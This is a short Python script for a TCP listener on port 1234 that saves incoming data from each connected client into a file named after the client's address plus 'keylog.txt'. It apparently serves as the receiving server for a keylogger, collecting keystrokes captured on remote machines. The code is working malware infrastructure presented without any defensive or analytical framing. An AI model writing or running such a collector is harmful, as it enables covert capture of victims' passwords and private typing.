import socket 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 1234))
s.listen(5)  # Listen for connections
try:
    while True:
        clientsocket, address = s.accept()  # Accept a connection
        print(f"Connection from {address} has been established.")
        with open(f"{address} keylog.txt", "a") as f:
            while True:
                        msg = clientsocket.recv(8).decode("utf-8")  # Receive data
                        f.write(msg)  # Write to file
                        if not msg:  # Check if the connection is lost
                            break
except KeyboardInterrupt:
    print("Server shutting down.")